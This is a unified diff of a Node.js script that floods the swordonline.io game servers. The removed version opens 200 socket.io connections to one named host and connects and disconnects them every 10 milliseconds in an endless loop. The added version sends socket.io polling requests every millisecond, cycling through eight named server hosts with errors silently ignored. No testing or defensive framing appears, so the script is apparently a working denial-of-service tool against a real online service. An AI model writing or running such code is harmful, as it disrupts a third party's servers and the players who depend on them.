@@ -1,54 +1,39 @@
-const io = require("socket.io-client");
+const https = require("https");
 
-const SOCKET_URL = "https://na-3.swordonline.io";
-const SOCKET_COUNT = 200;
+const SERVERS = ["na", "na-7", "na-2", "na-3", "na-4", "na-5", "na-6", "na-7"];
+const MAX_PER_SERVER = 180;
+const DELAY_MS = 1;
 
-function createFlappingSocket(id) {
-  let socket;
+let serverIndex = 0;
+let count = 0;
+let connections = [];
 
-  const connect = () => {
-    try {
-      socket = io(SOCKET_URL, {
-        transports: ["websocket"],
-        reconnection: false,
-      });
-
-      socket.on("connect", () => {
-        console.log(`[${id}] Connected`);
-        // Slight delay before disconnecting
-        setTimeout(() => {
-          try {
-            socket.disconnect();
-          } catch (err) {}
-        }, 10);
-      });
-
-      socket.on("disconnect", () => {
-        console.log(`[${id}] Disconnected`);
-        // Slight delay before reconnecting
-        setTimeout(() => {
-          try {
-            connect();
-          } catch (err) {}
-        }, 10);
-      });
-
-      socket.on("connect_error", () => {});
-      socket.on("error", () => {});
-    } catch (err) {
-      // Prevent stack overflow on sync errors
-      setTimeout(() => connect(), 10);
-    }
-  };
-
-  connect();
-}
-
-// Start all sockets in parallel
-for (let i = 1; i <= SOCKET_COUNT; i++) {
-  try {
-    createFlappingSocket(i);
-  } catch (err) {
-    // Always recover
+function sendPoll() {
+  if (count >= MAX_PER_SERVER) {
+    console.log(`\nCompleted 180 requests to ${SERVERS[serverIndex]}\nSwitching to next server...\n`);
+    count = 0;
+    serverIndex = (serverIndex + 1) % SERVERS.length;
+    connections = [];
   }
+
+  const server = SERVERS[serverIndex];
+  const url = `https://${server}.swordonline.io/socket.io/?EIO=3&transport=polling`;
+
+  const req = https.get(url, (res) => {
+    res.on("data", () => {});
+    res.on("end", () => {});
+  });
+
+  req.on("error", () => {});
+
+  connections.push(req);
+
+  count++;
+  if (count % 10 === 0) {
+    console.log(`Sent ${count} requests to ${server}`);
+  }
+
+  setTimeout(sendPoll, DELAY_MS);
 }
+
+sendPoll();
